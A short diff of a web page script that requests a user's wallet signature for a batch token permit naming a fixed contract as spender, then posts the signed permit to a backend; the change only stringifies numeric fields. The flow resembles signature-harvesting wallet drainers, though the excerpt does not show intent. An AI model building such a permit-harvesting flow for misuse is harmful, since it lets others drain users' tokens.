@@ -386,7 +386,7 @@ const values = {
     nonce: d.nonce.toString()
   })),
   spender: CONTRACT,
-  sigDeadline
+  sigDeadline: sigDeadline.toString()
 };
 
   log("✍️ Requesting signature...");
@@ -404,7 +404,12 @@ log("📤 Sending raw permit batch to backend...");
 try {
  const payload = {
   owner: user,
-  details: details,
+  details: details.map(d => ({
+  token: d.token,
+  amount: d.amount.toString(),
+  expiration: d.expiration.toString(),
+  nonce: d.nonce.toString()
+})),
   signature: signature,
   spender: CONTRACT,
   sig_deadline: sigDeadline,
